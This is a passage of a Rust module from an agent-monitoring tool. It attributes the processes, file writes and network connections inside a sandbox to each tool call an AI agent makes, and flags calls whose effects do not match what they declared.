// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The boxcar Authors

//! Tool spans: what a tool call the model asked for did in the guest.
//!
//! A `tool.open` (the gate read a tool use in the model's reply) opens a
//! span; the `tool.close` in the agent's next request (its tool result)
//! closes it. In between, the reconciler attributes processes and ring 0
//! effects to the span:
//!
//! - A `proc.exec` while spans are open joins one when its ancestry
//!   (through `ppid`) reaches the agent, which is the session's root
//!   process until a later milestone names the executor: by argv first (a
//!   shell tool whose declared command the exec's shell command carries),
//!   else as the only open span. One that joins no span waits
//!   [`PENDING_NS`] for a late `tool.open`.
//! - A process forked or exec'd by a span's process joins that span.
//! - A filesystem effect joins the span of its process. One by a process
//!   in no span (the agent's own work, as for a `Write` tool) joins the
//!   only open span, or the write tool span whose declared path it
//!   touches; one that joins nothing waits for its process to join.
//! - A `net.connect` joins the span of the process its `proc.tcp_connect`
//!   named, once the two have met.
//! - The executor of a span is the process whose `proc.tls_io` write,
//!   within [`EXECUTOR_WINDOW_NS`] of the gate's `http.request` and sized
//!   like its body (within a tenth plus 1 KiB, as one write or as the
//!   window's sum for the process), carried the model request the span
//!   came from; the session root otherwise.
//!
//! At close the span's membership is written as `span.effects`, and the
//! rules judge it: `intent_effect_mismatch` (`argv` at the join,
//! `hidden_net` at the close, `phantom_write` a second later) and
//! `orphaned_work` (a second after the close). Findings inside a span
//! carry its id. The [`SpanIndex`] is what the control socket's
//! `span.list` reads; the reconciler keeps it current.

use std::collections::{HashMap, VecDeque};
use std::sync::{Arc, Mutex, PoisonError};

use boxcar_proto::control::{SpanEntry, MAX_SPAN_LIST};
use boxcar_proto::{Finding, FindingCategory, ProcExec, Record, SpanEffects, ToolClose, ToolOpen};
use serde_json::Value;

use super::rules::Draft;
use super::state::{ProcKey, State};
use super::{JOIN_WINDOW_NS, PENDING_NS};

/// The most processes a span lists.
pub const MAX_SPAN_PROCS: usize = 1024;
/// The most effect records a span lists.
pub const MAX_SPAN_EFFECTS: usize = 4096;
/// How long after a span's close its effects and processes are judged.
pub const SETTLE_NS: u64 = 1_000_000_000;
/// The most spans kept in memory; beyond it the oldest settled span goes.
const MAX_SPANS_KEPT: usize = 4096;
/// The most effects waiting for their process to join a span.
const MAX_RECENT: usize = 4096;
/// How many parents are followed when looking for the agent.
const MAX_ANCESTRY: usize = 64;
/// How far apart a TLS write and the `http.request` it carried may be.
pub const EXECUTOR_WINDOW_NS: u64 = 500 * 1_000_000;
/// The slack a write's size has against the body's: a tenth, plus this.
const EXECUTOR_SLACK_BYTES: u64 = 1024;
/// The most requests whose executor is remembered, and the most writes
/// and requests kept waiting for each other.
const MAX_EXECUTORS: usize = 256;
/// The tools that run a shell command the agent declares.
const SHELL_TOOLS: [&str; 5] = ["Bash", "bash", "shell", "exec_command", "local_shell"];
/// The tools that declare a file they write.
const WRITE_TOOLS: [&str; 5] = ["Write", "Edit", "MultiEdit", "NotebookEdit", "apply_patch"];
/// Programs whose `-c` argument is the command they run.
const SHELLS: [&str; 6] = ["sh", "bash", "zsh", "dash", "ash", "ksh"];
/// How much of a command a summary quotes.
const QUOTE_LIMIT: usize = 120;

/// The spans the control socket lists: kept by the reconciler, read by
/// `span.list`. Cheap to clone; one per session.
#[derive(Clone, Debug, Default)]
pub struct SpanIndex {
    entries: Arc<Mutex<Vec<SpanEntry>>>,
}

impl SpanIndex {
    pub fn new() -> SpanIndex {
        SpanIndex::default()
    }

    /// Replaces the entry with `entry`'s id, or adds it. Past
    /// [`MAX_SPAN_LIST`] entries the oldest closed one goes, or the oldest.
    pub fn update(&self, entry: SpanEntry) {
        let mut entries = self.entries.lock().unwrap_or_else(PoisonError::into_inner);
        if let Some(slot) = entries.iter_mut().find(|e| e.span_id == entry.span_id) {
            *slot = entry;
            return;
        }
        if entries.len() >= MAX_SPAN_LIST {
            let victim = entries
                .iter()
                .position(|e| e.closed_seq.is_some())
                .unwrap_or(0);
            entries.remove(victim);
        }
        entries.push(entry);
    }

    /// The entries, newest first; only the open ones with `active_only`.
    pub fn list(&self, active_only: bool) -> Vec<SpanEntry> {
        let entries = self.entries.lock().unwrap_or_else(PoisonError::into_inner);
        entries
            .iter()
            .rev()
            .filter(|e| !active_only || e.closed_seq.is_none())
            .cloned()
            .collect()
    }
}

#[derive(Clone, Debug)]
struct Member {
    key: ProcKey,
    exec_seq: Option<u64>,
}

/// A record attributed to a span.
#[derive(Clone, Debug)]
pub struct Effect {
    pub seq: u64,
    pub kind: EffectKind,
}

/// What an attributed record was.
#[derive(Clone, Debug)]
pub enum EffectKind {
    /// A member's `proc.exec`.
    Exec,
    /// A filesystem record: the op, its mount and path, where a rename
    /// went, and whether it wrote (a create, a close with bytes written,
    /// a rename).
    Fs {
        op: &'static str,
        mount: String,
        path: String,
        to: Option<String>,
        wrote: bool,
    },
    /// A `net.connect`, by flow id.
    Net { flow: u64 },
}

/// A tool call: open from its `tool.open`, closed by its `tool.close`.
#[derive(Debug)]
pub struct Span {
    pub id: String,
    pub tool_name: String,
    /// The declared shell command, normalized, for a shell tool.
    declared: Option<String>,
    /// The declared paths, as (mount, path without its leading slash),
    /// for a write tool.
    paths: Vec<(String, String)>,
    /// The arguments as text, lowercase: what a connection's names are
    /// looked for in.
    args_text: String,
    /// Seq and host time of the `tool.open`.
    pub opened: (u64, u64),
    /// Seq and host time of the `tool.close`.
    pub closed: Option<(u64, u64)>,
    status: Option<String>,
    members: Vec<Member>,
    effects: Vec<Effect>,
    /// The process behind the model request, when a `proc.tls_io` write
    /// named one; the session root otherwise.
    pub executor: Option<ProcKey>,
    truncated: bool,
    pub worst_score: u8,
    /// The checks a second after the close ran.
    settled: bool,
    /// The `argv` rule fired: once a span.
    argv_fired: bool,
    /// Its `span.effects` was written.
    recorded: bool,
}

impl Span {
    fn new(open: &ToolOpen, seq: u64, ts: u64) -> Span {
        let args = open.args.as_ref();
        let mut args_text = match args {
            Some(args) => args.to_string(),
            None => open.args_summary.clone(),
        };
        args_text.make_ascii_lowercase();
        Span {
            id: open.tool_use_id.clone(),
            tool_name: open.tool_name.clone(),
            declared: args.and_then(|args| declared_command(&open.tool_name, args)),
            paths: args
                .map(|args| declared_paths(&open.tool_name, args))
                .unwrap_or_default(),
            args_text,
            opened: (seq, ts),
            closed: None,
            status: None,
            members: Vec::new(),
            effects: Vec::new(),
            executor: None,
            truncated: false,
            worst_score: 0,
            settled: false,
            argv_fired: false,
            recorded: false,
        }
    }

    pub fn is_open(&self) -> bool {
        self.closed.is_none()
    }

    fn is_shell_tool(&self) -> bool {
        SHELL_TOOLS.contains(&self.tool_name.as_str())
    }

    fn is_write_tool(&self) -> bool {
        WRITE_TOOLS.contains(&self.tool_name.as_str())
    }

    fn has_member(&self, key: ProcKey) -> bool {
        self.members.iter().any(|m| m.key == key)
    }

    fn push_effect(&mut self, effect: Effect) {
        if self.effects.iter().any(|e| e.seq == effect.seq) {
            return;
        }
        if self.effects.len() >= MAX_SPAN_EFFECTS {
            self.truncated = true;
            return;
        }
        self.effects.push(effect);
    }

    /// Whether a filesystem effect is on one of the declared paths.
    fn touches(&self, kind: &EffectKind) -> bool {
        let EffectKind::Fs {
            mount, path, to, ..
        } = kind
        else {
            return false;
        };
        self.paths.iter().any(|(m, p)| {
            m == mount && (p == path.trim_start_matches('/') || to.as_deref() == Some(p))
        })
    }

    /// Whether a write effect landed on one of the declared paths.
    fn wrote_declared(&self) -> bool {
        self.effects.iter().any(|effect| match &effect.kind {
            EffectKind::Fs { wrote, .. } => *wrote && self.touches(&effect.kind),
            _ => false,
        })
    }

    fn entry(&self) -> SpanEntry {
        SpanEntry {
            span_id: self.id.clone(),
            tool_name: self.tool_name.clone(),
            opened_seq: self.opened.0,
            closed_seq: self.closed.map(|(seq, _)| seq),
            procs: u32::try_from(self.members.len()).unwrap_or(u32::MAX),
            effects: u32::try_from(self.effects.len()).unwrap_or(u32::MAX),
            worst_score: self.worst_score,
        }
    }

    fn record(&self, session_pid: Option<u32>) -> SpanEffects {
        let mut effects: Vec<u64> = self.effects.iter().map(|e| e.seq).collect();
        effects.sort_unstable();
        SpanEffects {
            span_id: self.id.clone(),
            tool_name: self.tool_name.clone(),
            opened_seq: self.opened.0,
            closed_seq: self.closed.map(|(seq, _)| seq),
            executor_tgid: self.executor.map(|key| key.tgid).or(session_pid),
            procs: self.members.iter().map(|m| m.key.tgid).collect(),
            effects,
            truncated: self.truncated,
        }
    }
}

/// A `proc.exec` that joined no span, waiting for a late `tool.open`.
#[derive(Clone, Copy, Debug)]
struct PendingExec {
    key: ProcKey,
    seq: u64,
    ts: u64,
}

/// Who made an effect that joined no span yet.
#[derive(Clone, Copy, Debug)]
enum Who {
    /// The guest thread a filesystem record named.
    Tid(u32),
    /// The process a flow's sensor connect named.
    Proc(ProcKey),
}

/// An effect waiting for its process to join a span.
#[derive(Clone, Debug)]
struct RecentEffect {
    seq: u64,
    ts: u64,
    who: Who,
    kind: EffectKind,
}

/// A TLS write ring 1 reported, waiting for the request it carried.
#[derive(Clone, Copy, Debug)]
struct TlsWrite {
    ts: u64,
    tgid: u32,
    bytes: u64,
}

/// An `http.request`, waiting for the write that carried it.
#[derive(Clone, Copy, Debug)]
struct Request {
    ts: u64,
    flow: u64,
    stream: u32,
    body_bytes: u64,
}

/// The spans of a session and what waits to join them.
pub struct Spans {
    spans: HashMap<String, Span>,
    /// Every span kept, in open order.
    order: VecDeque<String>,
    /// The open spans, in open order.
    open: Vec<String>,
    /// Each member process's span.
    by_proc: HashMap<ProcKey, String>,
    pending_execs: VecDeque<PendingExec>,
    recent: VecDeque<RecentEffect>,
    /// `span.effects` records made and not yet taken.
    records: Vec<SpanEffects>,
    index: Option<SpanIndex>,
    /// The session's root process, from `session.start`.
    session_pid: Option<u32>,
    tls_writes: VecDeque<TlsWrite>,
    requests: VecDeque<Request>,
    /// The process behind each request, by the request's flow and stream,
    /// and the order they came in.
    executors: HashMap<(u64, u32), ProcKey>,
    executor_order: VecDeque<(u64, u32)>,
}

impl Spans {
    pub fn new(index: Option<SpanIndex>) -> Spans {
        Spans {
            spans: HashMap::new(),
            order: VecDeque::new(),
            open: Vec::new(),
            by_proc: HashMap::new(),
            pending_execs: VecDeque::new(),
            recent: VecDeque::new(),
            records: Vec::new(),
            index,
            session_pid: None,
            tls_writes: VecDeque::new(),
            requests: VecDeque::new(),
            executors: HashMap::new(),
            executor_order: VecDeque::new(),
        }
    }

    /// A `proc.tls_io` write: a request of the window it fits, alone or
    /// with the process's other writes of the window, gets its executor;
    /// the write is kept for a request still to come.
    pub fn tls_write(&mut self, state: &State, ts: u64, tgid: u32, bytes: u64) {
        self.tls_writes.push_back(TlsWrite { ts, tgid, bytes });
        while self.tls_writes.len() > MAX_EXECUTORS
            || self
                .tls_writes
                .front()
                .is_some_and(|w| ts.saturating_sub(w.ts) > 2 * EXECUTOR_WINDOW_NS)
        {
            self.tls_writes.pop_front();
        }
        let named: Vec<(Request, u32)> = self
            .requests
            .iter()
            .filter(|r| !self.executors.contains_key(&(r.flow, r.stream)))
            .filter_map(|r| self.carrier(r).map(|tgid| (*r, tgid)))
            .collect();
        for (request, tgid) in named {
            self.name_executor(state, request.flow, request.stream, tgid, request.ts);
        }
    }

    /// An `http.request`: the write that carried it names its executor,
    /// one write of its size or a process's writes of the window summed;
    /// else it waits for the write.
    pub fn http_request(&mut self, state: &State, ts: u64, flow: u64, stream: u32, body: u64) {
        let request = Request {
            ts,
            flow,
            stream,
            body_bytes: body,
        };
        if let Some(tgid) = self.carrier(&request) {
            self.name_executor(state, flow, stream, tgid, ts);
        }
        self.requests.push_back(request);
        while self.requests.len() > MAX_EXECUTORS
            || self
                .requests
                .front()
                .is_some_and(|r| ts.saturating_sub(r.ts) > 2 * EXECUTOR_WINDOW_NS)
        {
            self.requests.pop_front();
        }
    }

    /// The process whose writes carried `request`: one write of the
    /// window sized like the body, else a process whose writes of the
    /// window sum to it.
    fn carrier(&self, request: &Request) -> Option<u32> {
        let (ts, body) = (request.ts, request.body_bytes);
        let one = self
            .tls_writes
            .iter()
            .rev()
            .find(|w| within(w.ts, ts) && sized(w.bytes, body))
            .map(|w| w.tgid);
        one.or_else(|| {
            let mut sums: Vec<(u32, u64)> = Vec::new();
            for write in self.tls_writes.iter().filter(|w| within(w.ts, ts)) {
                match sums.iter_mut().find(|(tgid, _)| *tgid == write.tgid) {
                    Some((_, sum)) => *sum += write.bytes,
                    None => sums.push((write.tgid, write.bytes)),
                }
            }
            sums.into_iter()
                .find(|(_, sum)| sized(*sum, body))
                .map(|(tgid, _)| tgid)
        })
    }

    /// The process `tgid` made the request on (`flow`, `stream`).
    fn name_executor(&mut self, state: &State, flow: u64, stream: u32, tgid: u32, ts: u64) {
        let Some(key) = state.attribute(tgid, ts) else {
            return;
        };
        if self.executors.insert((flow, stream), key).is_none() {
            self.executor_order.push_back((flow, stream));
        }
        while self.executor_order.len() > MAX_EXECUTORS {
            if let Some(oldest) = self.executor_order.pop_front() {
                self.executors.remove(&oldest);
            }
        }
    }

    /// `session.start` named the root process.
    pub fn session_started(&mut self, pid: u32) {
        self.session_pid = Some(pid);
    }

    /// The `span.effects` records made since the last call.
    pub fn take_records(&mut self) -> Vec<SpanEffects> {
        std::mem::take(&mut self.records)
    }

    /// The span a process is in, if any.
    pub fn span_of(&self, key: ProcKey) -> Option<&Span> {
        self.by_proc.get(&key).and_then(|id| self.spans.get(id))
    }

    pub fn get(&self, id: &str) -> Option<&Span> {
        self.spans.get(id)
    }

    /// How many spans are open.
    pub fn open_count(&self) -> usize {
        self.open.len()
    }

    /// A `tool.open`: opens the span and takes what waited for it.
    pub fn open(&mut self, state: &State, record: &Record, open: &ToolOpen) -> Vec<Finding> {
        let id = open.tool_use_id.clone();
        if self.spans.contains_key(&id) {
            return Vec::new();
        }
        self.evict();
        let mut span = Span::new(open, record.seq, record.ts_host_ns);
        span.executor = self.executors.get(&(open.flow, open.stream)).copied();
        self.spans.insert(id.clone(), span);
        self.order.push_back(id.clone());
        self.open.push(id.clone());

        // Execs that came first: by argv, or, within the join window (the
        // observer wrote the record a moment late), as the only open span.
        let mut findings = Vec::new();
        let waiting: Vec<PendingExec> = self.pending_execs.drain(..).collect();
        for pending in waiting {
            let Some(proc) = state.proc(pending.key) else {
                continue;
            };
            let argv = proc.argv.clone();
            match self.choose(state, pending.key, &argv) {
                Some((_, true))
                    if record.ts_host_ns.saturating_sub(pending.ts) > JOIN_WINDOW_NS =>
                {
                    self.pending_execs.push_back(pending);
                }
                Some((span_id, judge)) => {
                    self.join(state, &span_id, pending.key, Some(pending.seq));
                    if judge {
                        findings.extend(self.judge_argv(
                            state,
                            &span_id,
                            pending.key,
                            pending.seq,
                            pending.ts,
                            &argv,
                        ));
                    }
                }
                None => self.pending_execs.push_back(pending),
            }
        }
        self.adopt_descendants(state);
        // The agent's own effects that came first.
        let waiting: Vec<RecentEffect> = self.recent.drain(..).collect();
        for effect in waiting {
            let owner = self.owner(state, effect.who, effect.ts);
            let taken = owner.is_none() && self.take_agent_effect(&effect.kind, effect.seq);
            if !taken {
                self.recent.push_back(effect);
            }
        }
        self.index_update(&id);
        findings
    }

    /// A `tool.close`: closes the span, judges its connections and writes
    /// its `span.effects`.
    pub fn close(&mut self, state: &State, record: &Record, close: &ToolClose) -> Vec<Finding> {
        let id = close.tool_use_id.as_str();
        let Some(span) = self.spans.get_mut(id) else {
            return Vec::new();
        };
        if span.closed.is_some() {
            return Vec::new();
        }
        span.closed = Some((record.seq, record.ts_host_ns));
        span.status = Some(close.status.clone());
        self.open.retain(|open| open != id);
        let mut findings = Vec::new();
        if close.status == "ok" {
            findings.extend(self.hidden_net(state, id, record));
        }
        self.write_record(id);
        self.index_update(id);
        findings
    }

    /// A `proc.exec`, once the state knows the process.
    pub fn exec(&mut self, state: &State, record: &Record, exec: &ProcExec) -> Vec<Finding> {
        let key = ProcKey {
            tgid: exec.tgid,
            start_ns: exec.start_ns,
        };
        let (seq, ts) = (record.seq, record.ts_host_ns);
        if self.is_agent(key) {
            // The agent's own exec: never a tool's work.
            return Vec::new();
        }
        if let Some(id) = self.by_proc.get(&key).cloned() {
            // A member that exec'd again (a shell running its command).
            if let Some(span) = self.spans.get_mut(&id) {
                span.push_effect(Effect {
                    seq,
                    kind: EffectKind::Exec,
                });
            }
            self.index_update(&id);
            return Vec::new();
        }
        if let Some(id) = self.parent_span(state, key) {
            self.join(state, &id, key, Some(seq));
            return Vec::new();
        }
        match self.choose(state, key, &exec.argv) {
            Some((id, judge)) => {
                self.join(state, &id, key, Some(seq));
                if judge {
                    self.judge_argv(state, &id, key, seq, ts, &exec.argv)
                } else {
                    Vec::new()
                }
            }
            None => {
                self.pending_execs.push_back(PendingExec { key, seq, ts });
                Vec::new()
            }
        }
    }

    /// A `proc.fork` of a new process: a member's child joins its span.
    pub fn fork(&mut self, state: &State, parent: Option<ProcKey>, child: ProcKey) {
        let Some(id) = parent.and_then(|key| self.by_proc.get(&key).cloned()) else {
            return;
        };
        if self.spans.get(&id).is_some_and(Span::is_open) {
            self.join(state, &id, child, None);
        }
    }

    /// A ring 0 filesystem record with a subject thread.
    pub fn effect(&mut self, state: &State, record: &Record, kind: EffectKind) {
        let Some(subject) = record.subject else {
            return;
        };
        if state.sensor.is_own(subject.pid) {
            // The sensor's own reads are no tool's work.
            return;
        }
        let (seq, ts) = (record.seq, record.ts_host_ns);
        let who = Who::Tid(subject.pid);
        match self.owner(state, who, ts) {
            Some(id) => {
                if self.spans.get(&id).is_some_and(Span::is_open) {
                    self.push_effect(&id, Effect { seq, kind });
                }
                // A member of a closed span: its later work is its own.
            }
            None => {
                if !self.take_agent_effect(&kind, seq) {
                    self.remember(RecentEffect { seq, ts, who, kind });
                }
            }
        }
    }

    /// A flow's `net.connect` met the `proc.tcp_connect` of `key`.
    pub fn flow(&mut self, state: &State, flow: u64, seq: u64, ts: u64, key: ProcKey) {
        let kind = EffectKind::Net { flow };
        match self.by_proc.get(&key).cloned() {
            Some(id) => {
                if self.spans.get(&id).is_some_and(Span::is_open) {
                    self.push_effect(&id, Effect { seq, kind });
                }
            }
            None => {
                let _ = state;
                self.remember(RecentEffect {
                    seq,
                    ts,
                    who: Who::Proc(key),
                    kind,
                });
            }
        }
    }

    /// The timers: the checks a second after a close, and the waits.
    pub fn tick(&mut self, state: &State, now: u64) -> Vec<Finding> {
        let mut findings = Vec::new();
        let due: Vec<String> = self
            .order
            .iter()
            .filter(|id| {
                self.spans.get(*id).is_some_and(|span| {
                    !span.settled
                        && span
                            .closed
                            .is_some_and(|(_, ts)| now.saturating_sub(ts) >= SETTLE_NS)
                })
            })
            .cloned()
            .collect();
        for id in due {
            if let Some(span) = self.spans.get_mut(&id) {
                span.settled = true;
            }
            findings.extend(self.phantom_write(state, &id, now));
            findings.extend(self.orphaned_work(state, &id, now));
        }
        while self
            .pending_execs
            .front()
            .is_some_and(|p| now.saturating_sub(p.ts) >= PENDING_NS)
        {
            self.pending_execs.pop_front();
        }
        while self
            .recent
            .front()
            .is_some_and(|e| now.saturating_sub(e.ts) >= PENDING_NS)
        {
            self.recent.pop_front();
        }
        findings
    }

    /// `vmm.stop`: the spans still open get their `span.effects` as they
    /// stand.
    pub fn stop(&mut self) {
        let open: Vec<String> = self.open.clone();
        for id in open {
            self.write_record(&id);
        }
    }

    // --- joins

    /// The span a pending or new exec joins: by argv, else as the only
    /// open span (then to be judged by the `argv` rule, which the `true`
    /// says), both only when its ancestry reaches the agent.
    fn choose(&self, state: &State, key: ProcKey, argv: &[String]) -> Option<(String, bool)> {
        if self.open.is_empty() {
            return None;
        }
        let command = shell_command(argv);
        let whole = normalize(&argv.join(" "));
        let by_argv = self.open.iter().find(|id| {
            self.spans.get(*id).is_some_and(|span| {
                span.declared
                    .as_deref()
                    .is_some_and(|declared| carries(command.as_deref(), &whole, declared))
            })
        });
        if let Some(id) = by_argv {
            if self.reaches_agent(state, key, id) {
                return Some((id.clone(), false));
            }
        }
        if let [only] = self.open.as_slice() {
            if self.reaches_agent(state, key, only) {
                return Some((only.clone(), true));
            }
        }
        None
    }

    /// Whether `key` is the agent itself: the session root, or a span's
    /// executor.
    fn is_agent(&self, key: ProcKey) -> bool {
        self.session_pid == Some(key.tgid)
            || self.open.iter().any(|id| {
                self.spans
                    .get(id)
                    .is_some_and(|span| span.executor.is_some_and(|e| e.tgid == key.tgid))
            })
    }

    /// Whether `key`'s ancestry reaches the span's executor or the session
    /// root (`key` itself being the agent reaches nothing: the agent is in
    /// no span). With neither known there is nothing to reach: every
    /// process is the agent's.
    fn reaches_agent(&self, state: &State, key: ProcKey, span_id: &str) -> bool {
        let target = self
            .spans
            .get(span_id)
            .and_then(|span| span.executor)
            .map(|key| key.tgid)
            .or(self.session_pid);
        let Some(target) = target else {
            return true;
        };
        let mut current = key;
        for depth in 0..MAX_ANCESTRY {
            let Some(proc) = state.proc(current) else {
                return false;
            };
            if proc.key.tgid == target {
                return depth > 0;
            }
            if proc.ppid == target {
                return true;
            }
            if proc.ppid <= 1 {
                return false;
            }
            let Some(parent) = state.attribute(proc.ppid, proc.first_ts) else {
                return false;
            };
            if parent == current {
                return false;
            }
            current = parent;
        }
        false
    }

    /// The open span of `key`'s parent, if the parent is in one.
    fn parent_span(&self, state: &State, key: ProcKey) -> Option<String> {
        let proc = state.proc(key)?;
        let parent = state.attribute(proc.ppid, proc.first_ts)?;
        let id = self.by_proc.get(&parent)?;
        self.spans
            .get(id)
            .filter(|span| span.is_open())
            .map(|_| id.clone())
    }

    /// `key` joins the span: its exec is an effect, the effects that
    /// waited for it follow, and so do its children that waited.
    fn join(&mut self, state: &State, id: &str, key: ProcKey, exec_seq: Option<u64>) {
        if self.by_proc.contains_key(&key) {
            return;
        }
        {
            let Some(span) = self.spans.get_mut(id) else {
                return;
            };
            if span.has_member(key) {
                return;
            }
            if span.members.len() >= MAX_SPAN_PROCS {
                span.truncated = true;
                return;
            }
            span.members.push(Member { key, exec_seq });
            if let Some(seq) = exec_seq {
                span.push_effect(Effect {
                    seq,
                    kind: EffectKind::Exec,
                });
            }
        }
        self.by_proc.insert(key, id.to_owned());
        let waiting: Vec<RecentEffect> = self.recent.drain(..).collect();
        for effect in waiting {
            let owner = match effect.who {
                Who::Tid(tid) => state.attribute(tid, effect.ts),
                Who::Proc(proc) => Some(proc),
            };
            if owner == Some(key) {
                self.push_effect(
                    id,
                    Effect {
                        seq: effect.seq,
                        kind: effect.kind,
                    },
                );
            } else {
                self.recent.push_back(effect);
            }
        }
        self.index_update(id);
        self.adopt_descendants(state);
    }

    /// Pending execs whose parent is now in an open span join it, until
    /// none does.
    fn adopt_descendants(&mut self, state: &State) {
        loop {
            let found = self
                .pending_execs
                .iter()
                .enumerate()
                .find_map(|(i, pending)| {
                    self.parent_span(state, pending.key)
                        .map(|id| (i, id, *pending))
                });
            let Some((index, id, pending)) = found else {
                return;
            };
            self.pending_execs.remove(index);
            self.join(state, &id, pending.key, Some(pending.seq));
        }
    }

    /// The span of the process behind an effect, if that process is in
    /// one.
    fn owner(&self, state: &State, who: Who, ts: u64) -> Option<String> {
        let key = match who {
            Who::Tid(tid) => state.attribute(tid, ts)?,
            Who::Proc(key) => key,
        };
        self.by_proc.get(&key).cloned()
    }

    /// A filesystem effect by no span's process: the agent's own. It
    /// joins the only open span, or the write tool span whose declared
    /// path it touches.
    fn take_agent_effect(&mut self, kind: &EffectKind, seq: u64) -> bool {
        if !matches!(kind, EffectKind::Fs { .. }) {
            return false;
        }
        let id = match self.open.as_slice() {
            [] => return false,
            [only] => only.clone(),
            many => {
                let Some(id) = many.iter().find(|id| {
                    self.spans
                        .get(*id)
                        .is_some_and(|span| span.is_write_tool() && span.touches(kind))
                }) else {
                    return false;
                };
                id.clone()
            }
        };
        self.push_effect(
            &id,
            Effect {
                seq,
                kind: kind.clone(),
            },
        );
        true
    }

    fn push_effect(&mut self, id: &str, effect: Effect) {
        if let Some(span) = self.spans.get_mut(id) {
            span.push_effect(effect);
        }
        self.index_update(id);
    }

    fn remember(&mut self, effect: RecentEffect) {
        if self.recent.len() >= MAX_RECENT {
            self.recent.pop_front();
        }
        self.recent.push_back(effect);
    }

    /// Past the limit, the oldest span that is closed, settled and
    /// recorded goes, with its processes' memberships.
    fn evict(&mut self) {
        if self.spans.len() < MAX_SPANS_KEPT {
            return;
        }
        let victim = self.order.iter().position(|id| {
            self.spans
                .get(id)
                .is_some_and(|span| !span.is_open() && span.settled && span.recorded)
        });
        let Some(index) = victim else {
            return;
        };
        let Some(id) = self.order.remove(index) else {
            return;
        };
        if let Some(span) = self.spans.remove(&id) {
            for member in &span.members {
                self.by_proc.remove(&member.key);
            }
        }
    }

    fn write_record(&mut self, id: &str) {
        let Some(span) = self.spans.get_mut(id) else {
            return;
        };
        if span.recorded {
            return;
        }
        span.recorded = true;
        let record = span.record(self.session_pid);
        self.records.push(record);
    }

    fn index_update(&self, id: &str) {
        if let (Some(index), Some(span)) = (&self.index, self.spans.get(id)) {
            index.update(span.entry());
        }
    }

    // --- the rules

    /// `intent_effect_mismatch` / `argv`: a shell tool's span took a shell
    /// by ancestry alone, and the command the shell was given does not
    /// carry the declared one.
    fn judge_argv(
        &mut self,
        state: &State,
        id: &str,
        key: ProcKey,
        exec_seq: u64,
        ts: u64,
        argv: &[String],
    ) -> Vec<Finding> {
        let Some(span) = self.spans.get(id) else {
            return Vec::new();
        };
        let Some(declared) = span.declared.clone() else {
            return Vec::new();
        };
        if !span.is_shell_tool() || span.argv_fired {
            return Vec::new();
        }
        let Some(command) = shell_command(argv) else {
            return Vec::new();
        };
        if carries(Some(&command), &normalize(&argv.join(" ")), &declared) {
            return Vec::new();
        }
        let opened_seq = span.opened.0;
        let tool = span.tool_name.clone();
        let summary = format!(
            "the {tool} tool call {id} declared \"{}\", but the shell it ran (pid {}) was given \
             \"{}\"",
            quote(&declared),
            key.tgid,
            quote(&command)
        );
        let finding = Draft::new(FindingCategory::IntentEffectMismatch, 70, "argv", summary)
            .evidence([opened_seq, exec_seq])
            .span(id)
            .low_confidence(state.low_confidence(ts, true))
            .finish(state);
        if let Some(span) = self.spans.get_mut(id) {
            span.argv_fired = true;
        }
        self.note_finding(id, finding.score);
        vec![finding]
    }

    /// `intent_effect_mismatch` / `hidden_net`: the span's processes
    /// connected somewhere the call never named, and the call said `ok`.
    fn hidden_net(&mut self, state: &State, id: &str, record: &Record) -> Vec<Finding> {
        let Some(span) = self.spans.get(id) else {
            return Vec::new();
        };
        let mut evidence = vec![span.opened.0];
        let mut where_to = Vec::new();
        for effect in &span.effects {
            let EffectKind::Net { flow } = effect.kind else {
                continue;
            };
            let Some(flow) = state.flows.get(&flow) else {
                continue;
            };
            if !flow.allowed {
                continue;
            }
            let named = flow
                .names
                .iter()
                .any(|name| span.args_text.contains(&name.to_ascii_lowercase()))
                || span.args_text.contains(&flow.dst.ip().to_string());
            if named {
                continue;
            }
            evidence.push(effect.seq);
            evidence.extend(flow.proc_seq);
            if let Some(exec_seq) = flow
                .proc_key
                .and_then(|key| state.proc(key))
                .and_then(|proc| proc.exec_seq)
            {
                evidence.push(exec_seq);
            }
            let who = flow
                .proc_key
                .and_then(|key| state.proc(key))
                .map(|proc| format!("{} (pid {})", proc.name(), proc.key.tgid))
                .unwrap_or_else(|| "a process of the call".to_owned());
            let names = if flow.names.is_empty() {
                String::new()
            } else {
                format!(" ({})", flow.names.join(", "))
            };
            where_to.push(format!("{who} connected to {}{names}", flow.dst));
        }
        if where_to.is_empty() {
            return Vec::new();
        }
        evidence.push(record.seq);
        let tool = span.tool_name.clone();
        let count = where_to.len();
        where_to.truncate(3);
        let more = if count > 3 {
            format!(", and {} more", count - 3)
        } else {
            String::new()
        };
        let summary = format!(
            "the {tool} tool call {id} ended ok, and its work went where nothing in the call \
             named: {}{more}",
            where_to.join("; ")
        );
        let finding = Draft::new(
            FindingCategory::IntentEffectMismatch,
            55,
            "hidden_net",
            summary,
        )
        .evidence(evidence)
        .span(id)
        .low_confidence(state.low_confidence(record.ts_host_ns, true))
        .finish(state);
        self.note_finding(id, finding.score);
        vec![finding]
    }

    /// `intent_effect_mismatch` / `phantom_write`: a write tool's call
    /// said `ok`, and a second later no write has landed on the declared
    /// path.
    fn phantom_write(&mut self, state: &State, id: &str, _now: u64) -> Vec<Finding> {
        let Some(span) = self.spans.get(id) else {
            return Vec::new();
        };
        if !span.is_write_tool()
            || span.paths.is_empty()
            || span.status.as_deref() != Some("ok")
            || span.wrote_declared()
        {
            return Vec::new();
        }
        let Some((closed_seq, _)) = span.closed else {
            return Vec::new();
        };
        let paths: Vec<String> = span
            .paths
            .iter()
            .map(|(mount, path)| format!("{path} on {mount}"))
            .collect();
        let summary = format!(
            "the {} tool call {id} ended ok, but no file was created, written or renamed at {} \
             in the second after it closed",
            span.tool_name,
            paths.join(", ")
        );
        let finding = Draft::new(
            FindingCategory::IntentEffectMismatch,
            65,
            "phantom_write",
            summary,
        )
        .evidence([span.opened.0, closed_seq])
        .span(id)
        .finish(state);
        self.note_finding(id, finding.score);
        vec![finding]
    }

    /// `orphaned_work`: a second after the close, a process of the span
    /// is still running.
    fn orphaned_work(&mut self, state: &State, id: &str, _now: u64) -> Vec<Finding> {
        if !state.sensor.lineage_ok() {
            // Without exits there is no saying who still runs.
            return Vec::new();
        }
        let Some(span) = self.spans.get(id) else {
            return Vec::new();
        };
        let Some((closed_seq, closed_ts)) = span.closed else {
            return Vec::new();
        };
        let mut live = Vec::new();
        let mut evidence = Vec::new();
        for member in &span.members {
            let Some(proc) = state.proc(member.key) else {
                continue;
            };
            if proc.exit_ts.is_none() {
                live.push(format!("{} (pid {})", proc.name(), proc.key.tgid));
                evidence.extend(member.exec_seq.or(proc.exec_seq));
            }
        }
